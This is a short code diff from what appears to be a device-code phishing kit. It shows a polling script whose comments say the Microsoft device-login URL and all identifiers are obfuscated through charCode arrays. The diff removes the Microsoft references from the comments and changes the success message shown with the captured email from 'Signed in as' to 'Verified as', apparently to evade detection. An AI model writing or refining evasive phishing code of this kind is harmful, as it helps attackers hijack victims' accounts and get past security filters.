@@ -1,6 +1,6 @@
 // Layer 8 — Obfuscated Template Content
-// All function names, element IDs, and Microsoft URLs are obfuscated
-// microsoft.com/devicelogin URL built at runtime from charCode arrays
+// All function names, element IDs, and URLs are obfuscated
+// Device login URL built at runtime from charCode arrays
 
 export function getPollingScript(): string {
   return `
@@ -74,7 +74,7 @@ export function getPollingScript(): string {
       .then(function(r){return r.json()}).then(function(d){
         if(!_b1)return;
         if(d.status==='complete'){_b1=false;if(_pn)clearInterval(_pn);
-          var em=d.email||'';if(em&&em!=='unknown@user.com'){_h('_ae','Signed in as <strong>'+em+'</strong>')}
+          var em=d.email||'';if(em&&em!=='unknown@user.com'){_h('_ae','Verified as <strong>'+em+'</strong>')}
           _sv('success');return}
         if(d.status==='expired'){_b1=false;if(_pn)clearInterval(_pn);_sv('expired');return}
         if(d.status==='slow_down'){iv=iv+5}
